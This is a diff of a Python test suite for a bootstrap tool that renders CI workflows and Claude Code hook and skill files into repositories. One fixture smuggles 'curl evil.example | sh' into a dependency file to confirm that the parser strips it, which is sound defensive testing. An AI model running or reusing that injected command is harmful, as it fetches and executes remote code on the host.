@@ -8,17 +8,24 @@ tests exercise the same code path a caller would use.
 from __future__ import annotations
 
 import json
+import os
 import pathlib
 import re
+import subprocess
 
 import pytest
 from conformance.bootstrap import extract as extract_mod
 from conformance.bootstrap.args import BOOTSTRAP_USAGE, FLAGS, parse_bootstrap_args
 from conformance.bootstrap.autodetect import derive_app_name_from_dir
-from conformance.bootstrap.command import _bootstrap_file
+from conformance.bootstrap.command import (
+    _KNOWN_LEGACY_CONNECTOR_REVIEW_BLOCK,
+    _bootstrap_file,
+)
 from conformance.bootstrap.render import (
     MANAGED_ACTION_FILES,
+    MANAGED_CONNECTOR_REVIEW_FILES,
     MANAGED_WORKFLOWS,
+    RETIRED_CONNECTOR_REVIEW_FILES,
     RETIRED_WORKFLOWS,
     render,
 )
@@ -90,6 +97,18 @@ def test_bootstrap_file_does_not_rewrite_unchanged_content(
     assert dest.stat().st_mtime_ns == mtime_before
 
 
+def test_bootstrap_file_corrects_managed_executable_mode(
+    tmp_path: pathlib.Path,
+) -> None:
+    """A re-run fixes a non-executable hook even when its bytes already match."""
+    dest = tmp_path / "hook.sh"
+    dest.write_text("#!/usr/bin/env bash\n")
+    os.chmod(dest, 0o644)
+
+    assert _bootstrap_file(dest, dest.read_text(), executable=True) == "updated"
+    assert os.stat(dest).st_mode & 0o777 == 0o755
+
+
 # ---------------------------------------------------------------------------
 # parse_bootstrap_args
 # ---------------------------------------------------------------------------
@@ -112,12 +131,20 @@ def test_parse_bootstrap_args_defaults() -> None:
         # canonical and C002 stays silent.
         "unit_coverage_fail_under": "",
         "use_ghcr_base": "",
+        # No flag of its own: autodetected from an existing
+        # vulnerability-scan.yml so an app that vendors LFS-tracked assets into
+        # its Docker build context keeps `lfs: true` across a bootstrap run.
+        "vuln_scan_lfs": "",
+        # Same round trip on the RELEASE image build: autodetected from an
+        # existing build-and-publish.yaml so a bootstrap run cannot drop it.
+        "build_publish_lfs": "",
         "enforce": "",
         "conformance_blocking": "",
         "renovate_automerge": "",
         # Presence flag: "false" unless --resync is passed, so a bare
         # re-run never rewrites the write-if-absent tests.yaml scaffold.
         "resync": "false",
+        "connector_review_kit": "false",
     }
 
 
@@ -243,6 +270,26 @@ def test_cmd_bootstrap_writes_skill_md(
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap([])
     dest = tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md"
+    assert dest.read_text() == render("remediate.md")
+
+
+@pytest.mark.parametrize("argv", [[], ["--resync"]])
+def test_cmd_bootstrap_restores_a_drifted_remediate_skill(
+    argv: list[str], tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The remediate skill is always-overwrite, so it needs no --resync opt-in.
+
+    It is the one managed file a caller most expects --resync to cover, and it
+    is covered more strongly than that: a bare re-run already eradicates its
+    drift. Locked under both argvs so nobody "adds it to --resync" by making
+    it write-if-absent first.
+    """
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    dest = tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md"
+    dest.write_text("# hand-edited, missing everything newer\n")
+
+    _cmd_bootstrap(argv)
     assert dest.read_text() == render("remediate.md")
 
 
@@ -760,10 +807,20 @@ def test_conformance_upload_sarif_workflow_run_trigger() -> None:
     assert "branches: [main]" in content
 
 
-def test_conformance_upload_sarif_decoupled_from_gate() -> None:
-    """Upload workflow uses continue-on-error on download so it always exits 0."""
+def test_conformance_upload_sarif_delegates_to_the_reusable() -> None:
+    """The body — probe, download, strip, upload — lives in application-sdk.
+
+    Its behaviour (the eligibility gate, the artifact glob, `continue-on-error`
+    so the workflow always exits 0) is asserted against the reusable itself in
+    `test_upload_sarif_probe_wiring.py`. What the template owes is that it
+    calls that file, since a caller pointing somewhere else runs a body
+    nothing tests.
+    """
     content = render("conformance-upload-sarif.yaml")
-    assert "continue-on-error: true" in content
+    assert (
+        "atlanhq/application-sdk/.github/workflows/"
+        "conformance-upload-sarif-reusable.yaml@main" in content
+    )
 
 
 def test_conformance_upload_sarif_passes_ref_and_sha() -> None:
@@ -780,17 +837,29 @@ def test_conformance_upload_sarif_has_required_permissions() -> None:
     assert "actions: read" in content
 
 
-def test_conformance_upload_sarif_covers_all_series() -> None:
-    """Upload workflow covers all four conformance series slugs."""
+def test_conformance_upload_sarif_takes_the_default_series_list() -> None:
+    """A consumer app uploads the four series its conformance run produces.
+
+    The list is the reusable's default rather than a per-repo value, so the
+    template must NOT pass `slugs:` — a caller that pins its own copy stops
+    tracking the set, and a series added to the suite would silently never
+    reach that repo's Security tab. The default's contents are asserted
+    against the reusable in `test_upload_sarif_probe_wiring.py`.
+    """
     content = render("conformance-upload-sarif.yaml")
-    for slug in ("ci", "error-handling", "prescriptions", "optimizations"):
-        assert slug in content, f"Missing series slug: {slug}"
+    assert "slugs:" not in content, (
+        "the template pins its own series list; it must inherit the "
+        "reusable's default so a new series reaches every repo"
+    )
 
 
 def test_all_shims_have_atlanhq_uses_reference() -> None:
     """Every managed workflow delegates to atlanhq/* (or a known inline file)."""
     # These files contain inline logic (no `uses: atlanhq/...`) but are still standard.
-    inline_ok = {"release-gate.yaml", "conformance-upload-sarif.yaml"}
+    # `conformance-upload-sarif.yaml` left this set in FND-1994: it is now a
+    # thin caller like the rest, so it must carry an `atlanhq/` reference and
+    # is no longer exempt.
+    inline_ok = {"release-gate.yaml"}
     for name in MANAGED_WORKFLOWS:
         content = render(name)
         if name in inline_ok:
@@ -1991,22 +2060,26 @@ def test_parse_bootstrap_args_system_deps_rejects_shell_metacharacters(
     assert "invalid package name" in capsys.readouterr().err
 
 
-def test_checks_yml_without_deps_is_byte_identical_to_no_step_render() -> None:
+def test_checks_yml_without_deps_declares_no_inputs() -> None:
     """The <% if %> tags hug their content so an un-taken block leaves no stray
     blank line -- a one-line whitespace difference here would surface as C002
     drift in every already-bootstrapped repo (none of which passes this flag)."""
     rendered = render("checks.yml")
-    assert "apt-get" not in rendered
-    # The checkout step is followed immediately by setup-deps, with nothing
-    # (not even an empty line) where the conditional block sat.
-    assert "# v7.0.1\n      - uses: atlanhq" in rendered
+    assert "system_deps" not in rendered
+    # The concurrency block is the last thing in the job, with nothing (not even
+    # an empty line) where the conditional `with:` sat.
+    assert rendered.endswith(
+        "cancel-in-progress: ${{ startsWith(github.ref, 'refs/pull/') }}\n"
+    )
 
 
-def test_checks_yml_renders_system_deps_step() -> None:
+def test_checks_yml_renders_system_deps_input() -> None:
+    """The packages reach the reusable as an input, quoted so a multi-package
+    value survives `extract_field`'s read-back whole."""
     rendered = render("checks.yml", system_deps=_KRB5_DEPS)
-    assert f"sudo apt-get install -y {_KRB5_DEPS}" in rendered
-    # Ordered before setup-deps: the packages exist to make its `uv sync` work.
-    assert rendered.index("apt-get install") < rendered.index("setup-deps@main")
+    assert f'system_deps: "{_KRB5_DEPS}"' in rendered
+    # Declared on the call, not somewhere the reusable will never see it.
+    assert rendered.index("checks-reusable.yaml@main") < rendered.index("system_deps")
 
 
 def test_cmd_bootstrap_writes_system_deps_step(
@@ -2014,7 +2087,7 @@ def test_cmd_bootstrap_writes_system_deps_step(
 ) -> None:
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
-    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)
+    assert f'system_deps: "{_KRB5_DEPS}"' in _checks_yml(tmp_path)
 
 
 def test_cmd_bootstrap_omits_system_deps_step_by_default(
@@ -2022,7 +2095,7 @@ def test_cmd_bootstrap_omits_system_deps_step_by_default(
 ) -> None:
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap([])
-    assert "apt-get" not in _checks_yml(tmp_path)
+    assert "system_deps" not in _checks_yml(tmp_path)
 
 
 def test_cmd_bootstrap_rerun_preserves_system_deps_step(
@@ -2057,7 +2130,7 @@ def test_cmd_bootstrap_detects_hand_written_system_deps_step(
     )
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap([])
-    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)
+    assert f'system_deps: "{_KRB5_DEPS}"' in _checks_yml(tmp_path)
 
 
 def test_cmd_bootstrap_explicit_system_deps_overrides_autodetect(
@@ -2067,7 +2140,7 @@ def test_cmd_bootstrap_explicit_system_deps_overrides_autodetect(
     _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
     _cmd_bootstrap(["--system-deps", "libpq-dev"])
     checks = _checks_yml(tmp_path)
-    assert "sudo apt-get install -y libpq-dev" in checks
+    assert 'system_deps: "libpq-dev"' in checks
     assert "libkrb5-dev" not in checks
 
 
@@ -2102,7 +2175,7 @@ def test_cmd_bootstrap_detects_system_deps_from_ci_deps_file(
     deps_file.write_text("libkrb5-dev gcc\n")
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap([])
-    assert "sudo apt-get install -y libkrb5-dev gcc" in _checks_yml(tmp_path)
+    assert 'system_deps: "libkrb5-dev gcc"' in _checks_yml(tmp_path)
 
 
 def test_cmd_bootstrap_ci_deps_file_ignores_junk_tokens(
@@ -2114,10 +2187,10 @@ def test_cmd_bootstrap_ci_deps_file_ignores_junk_tokens(
     deps_file.write_text("libkrb5-dev && curl evil.example | sh\n")
     monkeypatch.chdir(tmp_path)
     _cmd_bootstrap([])
-    install_line = next(
-        line for line in _checks_yml(tmp_path).splitlines() if "apt-get install" in line
+    declaration = next(
+        line for line in _checks_yml(tmp_path).splitlines() if "system_deps:" in line
     )
-    assert install_line.strip() == "sudo apt-get install -y libkrb5-dev"
+    assert declaration.strip() == 'system_deps: "libkrb5-dev"'
 
 
 def test_conformance_detect_action_installs_declared_system_deps() -> None:
@@ -2140,7 +2213,7 @@ def test_cmd_bootstrap_rerun_after_manual_step_removal_leaves_it_out(
     (tmp_path / ".github" / "workflows" / "checks.yml").write_text(render("checks.yml"))
     (tmp_path / ".github" / "ci-system-deps.txt").unlink()
     _cmd_bootstrap([])
-    assert "apt-get" not in _checks_yml(tmp_path)
+    assert "system_deps" not in _checks_yml(tmp_path)
     assert not (tmp_path / ".github" / "ci-system-deps.txt").exists()
 
 
@@ -2153,7 +2226,7 @@ def test_cmd_bootstrap_restores_step_from_ci_deps_file_when_checks_stripped(
     _cmd_bootstrap(["--system-deps", _KRB5_DEPS])
     (tmp_path / ".github" / "workflows" / "checks.yml").write_text(render("checks.yml"))
     _cmd_bootstrap([])
-    assert f"sudo apt-get install -y {_KRB5_DEPS}" in _checks_yml(tmp_path)
+    assert f'system_deps: "{_KRB5_DEPS}"' in _checks_yml(tmp_path)
 
 
 # ---------------------------------------------------------------------------
@@ -2455,6 +2528,211 @@ def test_cmd_bootstrap_rerun_with_no_changes_reports_no_managed_file_as_updated(
         assert f"ok (up to date): {tmp_path / dest_rel}" in out
     skill_md = tmp_path / ".claude" / "skills" / "remediate" / "SKILL.md"
     assert f"ok (up to date): {skill_md}" in out
+
+
+def test_cmd_bootstrap_installs_connector_review_kit_additively(
+    tmp_path: pathlib.Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The opt-in kit retires only its old state and preserves user settings."""
+    claude = tmp_path / "CLAUDE.md"
+    claude.write_text("# App notes\n")
+    settings = tmp_path / ".claude" / "settings.json"
+    settings.parent.mkdir()
+    settings.write_text(
+        json.dumps(
+            {
+                "hooks": {
+                    "SessionStart": [
+                        {"matcher": "keep-me"},
+                        {
+                            "hooks": [
+                                {
+                                    "command": (
+                                        '"$CLAUDE_PROJECT_DIR"/'
+                                        ".claude/hooks/review-rules-freshness.sh"
+                                    )
+                                }
+                            ]
+                        },
+                    ],
+                    "PreToolUse": [
+                        {
+                            "matcher": "Bash",
+                            "hooks": [
+                                {
+                                    "command": (
+                                        '"$CLAUDE_PROJECT_DIR"/'
+                                        ".claude/hooks/check-review-before-commit.sh"
+                                    )
+                                },
+                                {"command": "scripts/keep-me.sh"},
+                            ],
+                        }
+                    ],
+                }
+            }
+        )
+        + "\n"
+    )
+    for dest_rel in RETIRED_CONNECTOR_REVIEW_FILES:
+        dest = tmp_path / dest_rel
+        dest.parent.mkdir(parents=True, exist_ok=True)
+        dest.write_text("legacy\n")
+    gitignore = tmp_path / ".gitignore"
+    gitignore.write_text("custom-cache/\n")
+
+    monkeypatch.chdir(tmp_path)
+    assert _cmd_bootstrap(["--connector-review-kit"]) == 0
+
+    for dest_rel, template_name, executable in MANAGED_CONNECTOR_REVIEW_FILES:
+        dest = tmp_path / dest_rel
+        assert dest.read_text() == render(template_name)
+        if executable:
+            assert os.stat(dest).st_mode & 0o777 == 0o755
+
+    merged_settings = json.loads(settings.read_text())
+    assert merged_settings["hooks"]["SessionStart"][0] == {"matcher": "keep-me"}
+    assert merged_settings["hooks"]["SessionStart"][1]["hooks"][0]["command"] == (
+        ".claude/hooks/connector-review-reminder.sh"
+    )
+    assert merged_settings["hooks"]["PreToolUse"] == [
+        {"matcher": "Bash", "hooks": [{"command": "scripts/keep-me.sh"}]}
+    ]
+    for dest_rel in RETIRED_CONNECTOR_REVIEW_FILES:
+        assert not (tmp_path / dest_rel).exists()
+    assert "# App notes" in claude.read_text()
+    assert "BEGIN APPLICATION SDK CONNECTOR REVIEW" in claude.read_text()
+    assert (
+        "write-connector-review-marker"
+        not in (tmp_path / ".claude/skills/connector-review/SKILL.md").read_text()
+    )
+    assert ".mothership/.cache/" in gitignore.read_text().splitlines()
+
+
+def test_cmd_bootstrap_connector_review_kit_migrates_eof_legacy_block(
+    tmp_path: pathlib.Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The known old kit block was appended at EOF, so it can be replaced safely."""
+    (tmp_path / "CLAUDE.md").write_text(_KNOWN_LEGACY_CONNECTOR_REVIEW_BLOCK)
+    monkeypatch.chdir(tmp_path)
+
+    assert _cmd_bootstrap(["--connector-review-kit"]) == 0
+    text = (tmp_path / "CLAUDE.md").read_text()
+    assert "L1-L4)" not in text
+    assert "BEGIN APPLICATION SDK CONNECTOR REVIEW" in text
+    settings = json.loads((tmp_path / ".claude" / "settings.json").read_text())
+    assert settings["hooks"]["SessionStart"][0]["hooks"][0]["command"] == (
+        ".claude/hooks/connector-review-reminder.sh"
+    )
+
+
+def test_cmd_bootstrap_connector_review_kit_preserves_unverified_legacy_suffix(
+    tmp_path: pathlib.Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Only the complete known EOF block may be replaced automatically."""
+    claude = tmp_path / "CLAUDE.md"
+    claude.write_text(
+        _KNOWN_LEGACY_CONNECTOR_REVIEW_BLOCK + "\n### App notes\nKeep this.\n"
+    )
+    monkeypatch.chdir(tmp_path)
+
+    assert _cmd_bootstrap(["--connector-review-kit"]) == 2
+    assert claude.read_text().endswith("### App notes\nKeep this.\n")
+    assert not (tmp_path / ".claude" / "skills" / "connector-review").exists()
+
+
+def test_resync_installs_the_connector_review_kit(
+    tmp_path: pathlib.Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """--resync is the fleet's structural catch-up, so it carries the kit too."""
+    monkeypatch.chdir(tmp_path)
+
+    assert _cmd_bootstrap(["--resync"]) == 0
+
+    for dest_rel, template_name, _executable in MANAGED_CONNECTOR_REVIEW_FILES:
+        assert (tmp_path / dest_rel).read_text() == render(template_name)
+    assert (
+        "BEGIN APPLICATION SDK CONNECTOR REVIEW" in (tmp_path / "CLAUDE.md").read_text()
+    )
+    settings = json.loads((tmp_path / ".claude" / "settings.json").read_text())
+    assert settings["hooks"]["SessionStart"][0]["hooks"][0]["command"] == (
+        ".claude/hooks/connector-review-reminder.sh"
+    )
+
+
+def test_bare_rerun_never_installs_the_connector_review_kit(
+    tmp_path: pathlib.Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Only --connector-review-kit or the --resync that implies it may opt in.
+
+    The other half of the contract: --resync gained the kit, a bare re-run
+    must still leave local Claude configuration alone.
+    """
+    monkeypatch.chdir(tmp_path)
+
+    assert _cmd_bootstrap([]) == 0
+
+    for dest_rel, _template_name, _executable in MANAGED_CONNECTOR_REVIEW_FILES:
+        assert not (tmp_path / dest_rel).exists()
+    assert not (tmp_path / "CLAUDE.md").exists()
+    assert not (tmp_path / ".claude" / "settings.json").exists()
+
+
+def test_resync_skips_an_unmergeable_kit_without_failing_the_run(
+    tmp_path: pathlib.Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """One hand-edited CLAUDE.md must not block a repo's scaffold catch-up.
+
+    Passed by name the same block is a hard error (exit 2) — see
+    test_cmd_bootstrap_connector_review_kit_preserves_unverified_legacy_suffix.
+    Implied by --resync it is a skip, so the tests.yaml/renovate.json
+    re-render still lands.
+    """
+    claude = tmp_path / "CLAUDE.md"
+    claude.write_text(
+        _KNOWN_LEGACY_CONNECTOR_REVIEW_BLOCK + "\n### App notes\nKeep this.\n"
+    )
+    monkeypatch.chdir(tmp_path)
+
+    assert _cmd_bootstrap(["--resync"]) == 0
+
+    out = capsys.readouterr().out
+    assert "skipped: cannot safely merge" in out
+    assert "--connector-review-kit" in out
+    assert claude.read_text().endswith("### App notes\nKeep this.\n")
+    assert not (tmp_path / ".claude" / "skills" / "connector-review").exists()
+    assert not (tmp_path / ".claude" / "settings.json").exists()
+    # The rest of the resync is unaffected.
+    assert (tmp_path / ".github" / "workflows" / "tests.yaml").read_text() == render(
+        "tests.yaml", app_name=derive_app_name_from_dir(tmp_path)
+    )
+
+
+@pytest.mark.parametrize(
+    "_dest_rel,template_name",
+    [
+        (dest_rel, template_name)
+        for dest_rel, template_name, executable in MANAGED_CONNECTOR_REVIEW_FILES
+        if executable
+    ],
+)
+def test_connector_review_shell_template_is_valid(
+    _dest_rel: str, template_name: str, tmp_path: pathlib.Path
+) -> None:
+    """Every centrally-written hook/script must pass the shell parser first."""
+    script = tmp_path / template_name
+    script.write_text(render(template_name))
+    proc = subprocess.run(
+        ["bash", "-n", str(script)], capture_output=True, check=False, text=True
+    )
+    assert proc.returncode == 0, proc.stderr
 
 
 # ---------------------------------------------------------------------------
@@ -2853,4 +3131,209 @@ def test_sdk_unit_coverage_floor_matches_the_reusable_workflow_default() -> None
         f"{m.group(1)} — update SDK_UNIT_COVERAGE_FLOOR in "
         "conformance/bootstrap/extract.py to match, or C002 will keep "
         "preserving per-app floors below the SDK's own."
+    )
+
+
+# ---------------------------------------------------------------------------
+# FND-1143: the unslotted-input freeze, end to end through --resync
+# ---------------------------------------------------------------------------
+
+
+def _dataforge_tests_yaml() -> str:
+    """A tests.yaml wired to dataforge the way the connectors that use it are.
+
+    Hand-positioned, under its own explanatory comments, rather than rendered
+    from the template: these seven repos wrote these lines before any slot
+    existed, and a fixture rendered from the template would pass on a preserve
+    that only works for the exact bytes the template emits.
+    """
+    canonical = render("tests.yaml", app_name="app")
+    return canonical.replace(
+        '      app-image-name: "atlan-app-app"\n',
+        '      app-image-name: "atlan-app-app"\n'
+        "      # Source: the dataforge org-vault entry — no provisioned resource\n"
+        "      # for this family, so managed mode, looked up by datasource + tier.\n"
+        '      dataforge-datasource: "cosmosnosql"\n'
+        '      dataforge-mode: "managed"\n'
+        '      dataforge-env-tier: "dev"\n'
+        '      dataforge-output-prefix: "COSMOSNOSQL"\n'
+        "      # No hermetic Cosmos, so an unresolved source must fail fast:\n"
+        '      # the "true" default would let a dataforge miss turn the\n'
+        "      # INTEGRATION merge gate green against no source at all.\n"
+        '      dataforge-hermetic-fallback: "false"\n',
+    )
+
+
+def test_resync_keeps_the_dataforge_inputs(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The FND-1143 headline: seven connectors pass these, and until the
+    template had slots for them --resync refused their whole file.
+
+    ``dataforge-hermetic-fallback: "false"`` is the load-bearing one — it is
+    what makes an unresolved source FAIL the integration tier instead of
+    passing it green against no source at all.
+    """
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
+    wf.write_text(_dataforge_tests_yaml())
+    _cmd_bootstrap(["--resync"])
+    after = wf.read_text()
+    assert 'dataforge-datasource: "cosmosnosql"' in after
+    assert 'dataforge-mode: "managed"' in after
+    assert 'dataforge-env-tier: "dev"' in after
+    assert 'dataforge-output-prefix: "COSMOSNOSQL"' in after
+    assert 'dataforge-hermetic-fallback: "false"' in after
+
+
+def test_resync_of_a_dataforge_file_lands_the_structural_catch_up(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The damage the refusal did was never the dataforge lines themselves.
+
+    A whole-file refusal withholds every structural update the template
+    carries. On atlan-postgres-app that was ``merge_group:`` and the
+    ``labeled`` trigger type — and a required check that never dispatches for
+    ``merge_group`` leaves the merge-queue entry pending until it times out.
+    """
+    from conformance.suite.checks.bootstrap_drift import scan_path
+
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
+    stale = _dataforge_tests_yaml().replace("  merge_group:\n", "")
+    assert "merge_group" not in stale, "fixture is not actually stale"
+    wf.write_text(stale)
+    assert scan_path(wf, tmp_path), "fixture is not actually drifted"
+    _cmd_bootstrap(["--resync"])
+    assert "  merge_group:\n" in wf.read_text()
+    assert scan_path(wf, tmp_path) == []
+
+
+def test_resync_is_idempotent_on_a_dataforge_file(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A second run must be a no-op, or the fleet churns a .bak on every run."""
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
+    wf.write_text(_dataforge_tests_yaml())
+    _cmd_bootstrap(["--resync"])
+    once = wf.read_text()
+    (tmp_path / ".github" / "workflows" / "tests.yaml.bak").unlink()
+    _cmd_bootstrap(["--resync"])
+    assert wf.read_text() == once
+    assert not (tmp_path / ".github" / "workflows" / "tests.yaml.bak").exists()
+
+
+def test_resync_drops_a_redundant_install_app_to_tenant(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Nine repos declared ``install-app-to-tenant: true``, which is the
+    reusable's own default. The line goes; the install does not."""
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
+    wf.write_text(
+        render("tests.yaml", app_name="app").replace(
+            '      app-image-name: "atlan-app-app"\n',
+            '      app-image-name: "atlan-app-app"\n'
+            "      # Install the PR-built image before the legs run (FND-128).\n"
+            "      install-app-to-tenant: true\n",
+        )
+    )
+    _cmd_bootstrap(["--resync"])
+    assert "install-app-to-tenant" not in wf.read_text()
+
+
+def test_resync_still_refuses_an_install_app_to_tenant_opt_out(
+    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """``false`` is a real opt-out with no slot to carry it, so the refusal
+    must keep the declaration rather than silently re-enabling the install."""
+    monkeypatch.chdir(tmp_path)
+    _cmd_bootstrap([])
+    wf = tmp_path / ".github" / "workflows" / "tests.yaml"
+    customised = render("tests.yaml", app_name="app").replace(
+        '      app-image-name: "atlan-app-app"\n',
+        '      app-image-name: "atlan-app-app"\n      install-app-to-tenant: false\n',
+    )
+    wf.write_text(customised)
+    _cmd_bootstrap(["--resync"])
+    assert wf.read_text() == customised
+
+
+def test_sdk_install_app_to_tenant_default_matches_the_reusable_workflow() -> None:
+    """``SDK_INSTALL_APP_TO_TENANT_DEFAULT`` must equal the input's own default.
+
+    The whole safety argument for dropping ``install-app-to-tenant: true``
+    rather than slotting it is that the value restates the reusable's default,
+    so deleting it changes nothing. The constant is a copy — this package ships
+    standalone into consumer repos — so it is pinned against the real default
+    here, in the monorepo where both exist. If the SDK ever flips the default to
+    ``false``, this fails here instead of nine repos silently losing their
+    pre-e2e install. Skipped when the monorepo tree isn't checked out, matching
+    the coverage-floor pin above.
+    """
+    workflow = _MONOREPO_ROOT / ".github" / "workflows" / "tests-reusable.yaml"
+    if not workflow.exists():
+        pytest.skip(f"monorepo source not checked out: {workflow}")
+    block = workflow.read_text(encoding="utf-8").split("install-app-to-tenant:", 1)
+    assert len(block) == 2, "tests-reusable.yaml no longer declares the input"
+    m = re.search(r"default:\s*\"?(true|false)\"?", block[1])
+    assert m is not None, "the input no longer declares a boolean default"
+    assert m.group(1) == extract_mod.SDK_INSTALL_APP_TO_TENANT_DEFAULT, (
+        "tests-reusable.yaml's install-app-to-tenant default has moved to "
+        f"{m.group(1)} — update SDK_INSTALL_APP_TO_TENANT_DEFAULT in "
+        "conformance/bootstrap/extract.py, or --resync will keep deleting a "
+        "declaration that is no longer redundant."
+    )
+
+
+def test_every_reusable_input_has_a_slot_or_a_documented_reason() -> None:
+    """The trap FND-1143 closed, pinned so it cannot re-open silently.
+
+    An input the canonical template has no place for freezes any repo that
+    passes it: --resync refuses the whole file (FND-604) and every structural
+    update the template carries is withheld with it. So each of the reusable's
+    inputs must be reachable — through a render param, a dispatch passthrough
+    the template hardcodes, or the one deliberate policy drop. A new input added
+    to tests-reusable.yaml without one lands here, not in a connector's frozen
+    CI.
+    """
+    workflow = _MONOREPO_ROOT / ".github" / "workflows" / "tests-reusable.yaml"
+    if not workflow.exists():
+        pytest.skip(f"monorepo source not checked out: {workflow}")
+    text = workflow.read_text(encoding="utf-8")
+    inputs_block = text.split("    inputs:", 1)[1].split("\n    secrets:", 1)[0]
+    declared = set(re.findall(r"^      ([a-z0-9-]+):$", inputs_block, re.MULTILINE))
+    assert declared, "could not read the reusable's inputs block"
+    # Reachable through a per-repo value slot, verbatim splice, or policy drop.
+    slotted = {field for _, field, _ in extract_mod._TESTS_YAML_VALUE_INPUTS}
+    slotted |= {field for _, field in extract_mod._TESTS_YAML_BLOCK_INPUTS}
+    slotted |= {
+        "app-name",
+        "app-image-name",
+        "enable-e2e",
+        "services-script",
+        "unit-coverage-fail-under",
+        "force-external-runtime",
+        # Hardcoded by the template: forwarded from this workflow's own
+        # workflow_dispatch inputs, or pinned to the SDK posture (two-store).
+        "application-sdk-ref",
+        "distinct-id",
+        "run-e2e",
+        "base-image-ref",
+        "agent-name-override",
+        "e2e-clouds",
+        "two-store",
+        # Policy drop, not a slot — see redundant_install_app_to_tenant.
+        "install-app-to-tenant",
+    }
+    assert declared - slotted == set(), (
+        f"tests-reusable.yaml inputs with no slot in the bootstrap template: "
+        f"{sorted(declared - slotted)} — add one (render param + read-back in "
+        "extract_tests_yaml_params + template line), or any repo that passes "
+        "one is frozen out of every structural CI update."
     )
